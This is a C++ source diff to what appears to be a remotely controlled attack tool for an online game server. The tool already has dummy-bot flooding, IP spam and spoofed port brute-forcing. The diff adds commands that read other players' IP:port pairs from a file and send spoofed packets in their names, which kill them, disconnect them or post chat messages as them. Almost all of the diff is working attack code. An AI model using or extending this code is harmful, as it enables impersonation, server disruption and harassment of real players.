@@ -325,10 +325,6 @@ void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 
 		//Debug(&buffer[0], BufferSize);
 
-		ZeroMemory(buffer, 2048);
-		BufferSize = PackSay(&buffer[0], j, "abc", 0);
-		SendData((const char*)buffer, BufferSize, j);
-
 		// vote if wanted
 		if(Vote == 1 || Vote == -1)
 		{
@@ -587,6 +583,162 @@ void SpamIPs(const char *IP, int Port)
 	}
 }
 
+void KillAll(const char *IP, int Port)
+{
+	std::ifstream File("ips.txt");
+	if(!File)
+	{
+		printf("Failed to open ips.txt");
+		return;
+	}
+
+	if (!Create(&m_Sock[0]))
+		Close(0);
+
+	// loop through the file
+	std::string Line;
+	while(std::getline(File, Line))
+	{
+		char aSplit[512][256] = {{0}};
+		ZeroMemory(&aSplit, sizeof(aSplit));
+		int Split = 0;
+		int Char = 0;
+
+		// split the string
+		for(unsigned int i = 0; i < strlen(Line.c_str()); i++)
+		{
+			if(Line.c_str()[i] == ':')
+			{
+				Split++;
+				Char = 0;
+				continue;
+			}
+
+			aSplit[Split][Char] = Line.c_str()[i];
+			Char++;
+		}
+
+		m_FromIP[0] = inet_addr(aSplit[0]);
+		m_FromPort = htons(atoi(aSplit[1]));
+
+		m_ToIP = inet_addr(IP);
+		m_ToPort = htons(Port);
+
+		unsigned char buffer[2048];
+		int BufferSize = 0;
+		Reset(0);
+
+		// send the kill packet
+		ZeroMemory(buffer, sizeof(buffer));
+		BufferSize = PackKill(&buffer[0], 0);
+		SendData((const char*)buffer, BufferSize, 0);
+	}
+}
+
+void DCAll(const char *IP, int Port)
+{
+	std::ifstream File("ips.txt");
+	if(!File)
+	{
+		printf("Failed to open ips.txt");
+		return;
+	}
+
+	if (!Create(&m_Sock[0]))
+		Close(0);
+
+	// loop through the file
+	std::string Line;
+	while(std::getline(File, Line))
+	{
+		char aSplit[512][256] = {{0}};
+		ZeroMemory(&aSplit, sizeof(aSplit));
+		int Split = 0;
+		int Char = 0;
+
+		// split the string
+		for(unsigned int i = 0; i < strlen(Line.c_str()); i++)
+		{
+			if(Line.c_str()[i] == ':')
+			{
+				Split++;
+				Char = 0;
+				continue;
+			}
+
+			aSplit[Split][Char] = Line.c_str()[i];
+			Char++;
+		}
+
+		m_FromIP[0] = inet_addr(aSplit[0]);
+		m_FromPort = htons(atoi(aSplit[1]));
+
+		m_ToIP = inet_addr(IP);
+		m_ToPort = htons(Port);
+
+		unsigned char buffer[2048];
+		int BufferSize = 0;
+		Reset(0);
+
+		// send the disconnect packet
+		ZeroMemory(buffer, sizeof(buffer));
+		BufferSize = PackKill(&buffer[0], 0);
+		SendData((const char*)buffer, BufferSize, 0);
+	}
+}
+
+void ChatAll(const char *IP, int Port, const char *Msg)
+{
+	std::ifstream File("ips.txt");
+	if(!File)
+	{
+		printf("Failed to open ips.txt");
+		return;
+	}
+
+	if (!Create(&m_Sock[0]))
+		Close(0);
+
+	// loop through the file
+	std::string Line;
+	while(std::getline(File, Line))
+	{
+		char aSplit[512][256] = {{0}};
+		ZeroMemory(&aSplit, sizeof(aSplit));
+		int Split = 0;
+		int Char = 0;
+
+		// split the string
+		for(unsigned int i = 0; i < strlen(Line.c_str()); i++)
+		{
+			if(Line.c_str()[i] == ':')
+			{
+				Split++;
+				Char = 0;
+				continue;
+			}
+
+			aSplit[Split][Char] = Line.c_str()[i];
+			Char++;
+		}
+
+		m_FromIP[0] = inet_addr(aSplit[0]);
+		m_FromPort = htons(atoi(aSplit[1]));
+
+		m_ToIP = inet_addr(IP);
+		m_ToPort = htons(Port);
+
+		unsigned char buffer[2048];
+		int BufferSize = 0;
+		Reset(0);
+
+		// send the chat packet
+		ZeroMemory(buffer, sizeof(buffer));
+		BufferSize = PackSay(&buffer[0], 0, Msg, 0);
+		SendData((const char*)buffer, BufferSize, 0);
+	}
+}
+
 void BruteforcePort(const char *SrvIP, int Port, const char *SpoofIP)
 {
 	if (!Create(&m_Sock[0]))
@@ -838,6 +990,51 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				}
 				else
 					send(g_Client, "[Server]: Please use: bruteport <srvip> <srvport> <spoofip>", strlen("[Server]: Please use: bruteport <srvip> <srvport> <spoofip>"), 0);
+			}
+			else if(strcmp(aCmd[0], "killall") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0])
+				{
+					int Port = atoi(aCmd[2]);
+					KillAll(aCmd[1], Port);
+
+					send(g_Client, "[Server]: All players were killed!", strlen("[Server]: All players were killed!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: killall <srvip> <srvport>", strlen("[Server]: Please use: killall <srvip> <srvport>"), 0);
+			}
+			else if(strcmp(aCmd[0], "dcall") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0])
+				{
+					int Port = atoi(aCmd[2]);
+					DCAll(aCmd[1], Port);
+
+					send(g_Client, "[Server]: All players were disconnected!", strlen("[Server]: All players were disconnected!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: dcall <srvip> <srvport>", strlen("[Server]: Please use: dcall <srvip> <srvport>"), 0);
+			}
+			else if(strcmp(aCmd[0], "chatall") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
+				{
+					int Port = atoi(aCmd[2]);
+					char aMsg[256];
+					ZeroMemory(&aMsg, sizeof(aMsg));
+					for(int i = 3; i <= Cmd; i++)
+					{
+						char aBuf[128];
+						str_format(aBuf, sizeof(aBuf), "%s ", aCmd[i]);
+						str_append(aMsg, aBuf, sizeof(aMsg));
+					}
+
+					ChatAll(aCmd[1], Port, aMsg);
+
+					send(g_Client, "[Server]: Chatmessage was sent from all players!", strlen("[Server]: Chatmessage was sent from all players!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: chatall <srvip> <srvport> <msg>", strlen("[Server]: Please use: chatall <srvip> <srvport> <msg>"), 0);
 			}
 			else
 				send(g_Client, "[Server]: Unknown command.", strlen("[Server]: Unknown command."), 0);
